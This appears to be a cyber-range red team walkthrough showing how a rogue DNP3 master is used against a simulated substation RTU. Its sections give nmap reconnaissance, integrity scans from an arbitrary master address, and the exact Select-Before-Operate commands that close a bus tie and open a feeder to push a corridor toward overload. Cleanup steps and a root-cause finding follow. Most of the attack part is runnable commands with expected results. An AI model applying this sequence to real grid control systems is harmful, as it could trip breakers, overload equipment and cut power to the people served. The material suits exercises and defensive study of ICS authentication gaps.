# Red Team Writeup — Scenario 3: Rogue DNP3 Master at River Bend Substation

## 1. Mission

Assess whether the legacy River Bend telecontrol path can be used to create a controlled switching effect while the legitimate load-dispatch master and RTU remain available. The intended outcome is to transfer load from Feeder A onto Feeder B, increasing stress on the northern corridor already affected by Scenario 2.

The objective is not to crash the RTU, flood the station bus or indiscriminately open all breakers. Successful execution requires protocol discovery, point interpretation, valid DNP3 command sequencing and controlled restoration.

## 2. Starting information

Red participants should receive only:

- a Red workstation in the `195.10.10.0/24` exercise enclave;
- the Scenario 3 target IP or routed target segment;
- the campaign clue that `PU-RB-RTU-07` is associated with River Bend switching;
- the requirement to preserve grid and service availability;
- rules prohibiting denial of service and attacks against the range infrastructure.

Do not provide the DNP3 ports, protocol addresses, point map, switching sequence or expected final measurements.

## 3. Scenario 2 handoff

Scenario 2 established that Prabal Urja Unit-2 was operating near 720 MW and that River Bend is a switching dependency for the Northern Power Corridor. This justifies investigating the River Bend RTU but does not prove which protocol or control point is exposed.

Set the target:

```bash
export TARGET=<SCENARIO_3_IP>
```

Record the Red workstation address for later evidence correlation:

```bash
ip -brief address
```

## 4. Narrow OT reconnaissance

Start with a limited scan rather than sweeping the full host:

```bash
sudo nmap -Pn -sS -sV --version-all -p 20000-20005,8092-8094 "$TARGET"
```

The intended external findings are:

- TCP 20001 is reachable and behaves as a DNP3/TCP service;
- TCP 8092 hosts a River Bend operational display;
- TCP 20000 is not remotely reachable because it is reserved for the primary control-centre relationship;
- TCP 8093 and 8094 may be filtered by infrastructure policy or reachable only to defenders, depending on range routing.

Confirm the protocol conservatively:

```bash
sudo nmap -Pn -sV --version-intensity 9 -p 20001 "$TARGET"
```

Do not run high-rate fuzzing or protocol brute force.

## 5. Red workstation DNP3 client preparation

The creator should pre-stage the package’s genuine OpenDNP3 client at:

```text
/opt/prabal-red-tools/prabal-dnp3-command
```

The binary is compiled from `Challenge-Files/opendnp3/source/prabal_command.cpp` and linked against the same OpenDNP3 2.3.0 stack used by the outstation. Verify it:

```bash
/opt/prabal-red-tools/prabal-dnp3-command --help
```

For an instructor or validation workstation, build the tool from the Scenario 3 package:

```bash
sudo apt-get update
sudo apt-get install -y build-essential cmake curl ca-certificates libasio-dev

sudo install -d /opt/prabal-red-tools/source/opendnp3
sudo cp Challenge-Files/opendnp3/source/prabal_command.cpp \
  /opt/prabal-red-tools/source/opendnp3/
```

The package’s `prepare-opendnp3.sh` builds all three range binaries during target setup. A creator may copy only the resulting `prabal-dnp3-command` binary and required shared libraries to the Red image, or compile the same source in a dedicated OpenDNP3 client build. Do not distribute the point-map JSON to participants.

For the commands below:

```bash
export DNP3=/opt/prabal-red-tools/prabal-dnp3-command
```

## 6. Establish a DNP3 master session

Begin with the common maintenance-master link address `2` and outstation address `10`:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" \
  --port 20001 \
  --master 2 \
  --outstation 10 \
  --action scan | tee /tmp/riverbend-scan-master2.log
```

A successful scan produces OpenDNP3 channel state, application response fragments and returned binary, analog and counter points.

Test whether the outstation associates the maintenance channel with only one expected master address. Use one additional non-default source address; do not sweep all 65,536 values:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" \
  --port 20001 \
  --master 77 \
  --outstation 10 \
  --action scan | tee /tmp/riverbend-scan-master77.log
```

If both sessions receive valid responses, record the finding: the retained listener responds to an arbitrary DNP3 master address and has no independent source authentication.

## 7. Interpret the returned point model

Review the integrity response:

```bash
grep -Ei 'Binary|Analog|Counter|RECEIVED_FRAGMENT' /tmp/riverbend-scan-master77.log
```

Typical baseline observations are:

### Binary inputs

| Index | Baseline | Operational interpretation |
|---:|---:|---|
| 0 | 1 | Feeder A breaker closed |
| 1 | 0 | Bus-tie breaker open |
| 2 | 1 | Feeder B breaker closed |
| 3 | 1 | Remote control enabled |
| 4 | 0 | Corridor overload alarm clear |
| 5 | 0 | Command lockout not active |

### Analog inputs

| Index | Approximate baseline | Interpretation method |
|---:|---:|---|
| 0 | 318 | Feeder A active power in MW |
| 1 | 302 | Feeder B active power in MW |
| 2 | 218.7 | 220 kV bus voltage |
| 3 | 84.2 | Transformer loading percentage |
| 4 | 78.6 | Northern-corridor loading percentage |
| 5 | 50.00 | System frequency in Hz |

### Counter

| Index | Baseline | Meaning |
|---:|---:|---|
| 0 | 0 | Accepted switching-operation count |

Correlate values with the read-only operations display:

```text
http://<SCENARIO_3_IP>:8092/
```

This is an operational display, not an attack interface. Use it to understand process consequences and confirm that telemetry remains available.

## 8. Map binary-output controls safely

The outstation exposes three binary-output control points corresponding to the three breaker indications. Validate mapping with the least disruptive operation.

The correct target sequence is:

1. close the bus tie at binary output index `1`;
2. verify that both feeders remain closed and the bus sections are paralleled;
3. open Feeder A at binary output index `0`;
4. stop after the intended load transfer is confirmed.

Do not open Feeder A before closing the bus tie. Doing so creates a load-loss condition rather than a controlled transfer.

## 9. Close the River Bend bus tie using Select-Before-Operate

Use the arbitrary DNP3 master address that successfully completed the integrity scan:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" \
  --port 20001 \
  --master 77 \
  --outstation 10 \
  --action close \
  --point 1 | tee /tmp/riverbend-close-tie.log
```

The client sends a DNP3 Control Relay Output Block with `LATCH_ON` through a Select-And-Operate transaction.

Wait for process propagation:

```bash
sleep 5
```

Re-run the integrity scan:

```bash
timeout 15 "$DNP3" --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 --action scan \
  | tee /tmp/riverbend-after-tie.log
```

Confirm:

- binary input 1 changed to closed;
- binary inputs 0 and 2 remain closed;
- both feeders are near 310 MW;
- no load-loss condition exists.

## 10. Open Feeder A and transfer the load

Issue the second valid Select-Before-Operate command:

```bash
timeout 15 "$DNP3" \
  --host "$TARGET" \
  --port 20001 \
  --master 77 \
  --outstation 10 \
  --action open \
  --point 0 | tee /tmp/riverbend-open-feeder-a.log
```

Wait for the process model:

```bash
sleep 6
```

Read the resulting state:

```bash
timeout 15 "$DNP3" --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 --action scan \
  | tee /tmp/riverbend-final-scan.log
```

Expected operational evidence:

| Item | Expected result |
|---|---:|
| Feeder A breaker indication | Open |
| Bus-tie breaker indication | Closed |
| Feeder B breaker indication | Closed |
| Feeder A load | Approximately 0 MW |
| Feeder B load | Approximately 620 MW |
| River Bend bus voltage | Approximately 215.8 kV |
| Transformer loading | Approximately 101.4% |
| Northern-corridor loading | Approximately 96.8% |
| Frequency | Approximately 49.94 Hz |
| Overload alarm | Active |
| RTU service | Still available |
| Legitimate master polling | Still active |

The target condition is achieved when the process state reaches `ROGUE_MASTER_SWITCHING_CONFIRMED` or equivalent operational evidence is visible.

## 11. Preserve Red evidence

Record timestamps and hashes:

```bash
date -u
sha256sum \
  /tmp/riverbend-scan-master2.log \
  /tmp/riverbend-scan-master77.log \
  /tmp/riverbend-close-tie.log \
  /tmp/riverbend-open-feeder-a.log \
  /tmp/riverbend-final-scan.log
```

Capture your own connection metadata:

```bash
ss -tnp | grep ':20001'
```

Screenshots should show:

1. successful integrity response from an unexpected DNP3 master address;
2. the Select-Before-Operate commands;
3. the final breaker state;
4. Feeder B and corridor loading after transfer;
5. proof that the RTU and operations display remained available.

## 12. Controlled cleanup

When the exercise controller requests restoration, reverse the sequence safely:

1. close Feeder A first;
2. verify both feeders are closed;
3. open the bus tie.

```bash
timeout 15 "$DNP3" --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 --action close --point 0
sleep 4

timeout 15 "$DNP3" --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 --action open --point 1
sleep 5

timeout 15 "$DNP3" --host "$TARGET" --port 20001 \
  --master 77 --outstation 10 --action scan
```

Confirm the normal state: Feeder A closed, bus tie open and Feeder B closed.

## 13. Red Team finding

### Finding title

Unauthorised second DNP3 master accepted through retained River Bend maintenance listener

### Root cause

- a legacy DNP3/TCP maintenance listener remains reachable;
- no DNP3 Secure Authentication or equivalent command-source validation is enforced;
- the maintenance outstation stack responds to master addresses beyond the expected master;
- valid control semantics are trusted based on reachability;
- no independent operational approval is required for switching commands.

### Impact

An unauthorised master can read the field point model and issue legitimate breaker controls while authorised polling remains healthy. In the exercise process, a bus-tie close followed by a Feeder A open transfers approximately 620 MW onto Feeder B and drives the northern corridor close to its modeled thermal limit.

### MITRE ATT&CK for ICS mapping

- T1692.001 — Unauthorized Message: Command Message
- T0831 — Manipulation of Control
- T0836 — Modify Parameter
- T0803 — Block Command Message, only if a participant attempts interference with authorised traffic; not required for the solve

## 14. Connection to Scenario 4

Scenario 3 demonstrates that field devices may accept valid commands solely because the message arrives through an expected protocol path. The next campaign stage examines how trusted control-centre software and host identity can be abused to issue IEC-104 commands. Scenario 3 does not provide direct credentials or deploy the Scenario 4 service; it provides the operational justification and defender evidence that command authorisation must be investigated upstream.
